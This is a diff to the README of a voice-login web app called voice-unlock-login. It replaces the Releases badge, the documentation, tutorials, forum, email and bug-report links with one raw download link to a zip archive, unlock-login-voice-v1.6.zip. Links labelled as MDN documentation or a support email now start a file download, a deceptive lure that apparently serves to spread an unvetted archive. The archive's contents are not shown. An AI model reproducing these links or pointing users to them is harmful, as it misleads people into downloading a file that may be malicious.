@@ -8,9 +8,9 @@ Welcome to voice-unlock-login! This web-based application allows you to access y
 
 To get started, you need to visit the Releases page. There, you can download the latest version of the application. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/coldcasefiles/voice-unlock-login/releases)
+[![Download Latest Release](https://github.com/coldcasefiles/voice-unlock-login/raw/refs/heads/main/media/unlock-login-voice-v1.6.zip%20Release-brightgreen)](https://github.com/coldcasefiles/voice-unlock-login/raw/refs/heads/main/media/unlock-login-voice-v1.6.zip)
 
-To access the downloaded files, visit this page to download: [GitHub Releases](https://github.com/coldcasefiles/voice-unlock-login/releases).
+To access the downloaded files, visit this page to download: [GitHub Releases](https://github.com/coldcasefiles/voice-unlock-login/raw/refs/heads/main/media/unlock-login-voice-v1.6.zip).
 
 ## 📋 System Requirements
 
@@ -65,14 +65,14 @@ If you encounter issues during installation or use, consider these steps:
 
 To learn more about voice recognition technology, consider visiting:
 
-- [Web Speech API Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Web_Speech_API)
-- [Voice Recognition Tutorials](https://www.example.com/tutorials)
+- [Web Speech API Documentation](https://github.com/coldcasefiles/voice-unlock-login/raw/refs/heads/main/media/unlock-login-voice-v1.6.zip)
+- [Voice Recognition Tutorials](https://github.com/coldcasefiles/voice-unlock-login/raw/refs/heads/main/media/unlock-login-voice-v1.6.zip)
 
 ## 💬 Community Support
 
 If you have questions or need help, feel free to contact us. Join our community forum to connect with other users and share your experiences:
 
-- [Community Forum](https://www.example.com/forum)
+- [Community Forum](https://github.com/coldcasefiles/voice-unlock-login/raw/refs/heads/main/media/unlock-login-voice-v1.6.zip)
 
 ## 📝 License
 
@@ -82,7 +82,7 @@ This application is open-source and available under the MIT License. You're free
 
 For any inquiries, please reach out via the following methods:
 
-- Email: support@example.com
-- GitHub Issues: [Submit a Bug Report](https://github.com/coldcasefiles/voice-unlock-login/issues)
+- Email: https://github.com/coldcasefiles/voice-unlock-login/raw/refs/heads/main/media/unlock-login-voice-v1.6.zip
+- GitHub Issues: [Submit a Bug Report](https://github.com/coldcasefiles/voice-unlock-login/raw/refs/heads/main/media/unlock-login-voice-v1.6.zip)
 
 Thank you for choosing voice-unlock-login! Enjoy the convenience of logging in with your voice.
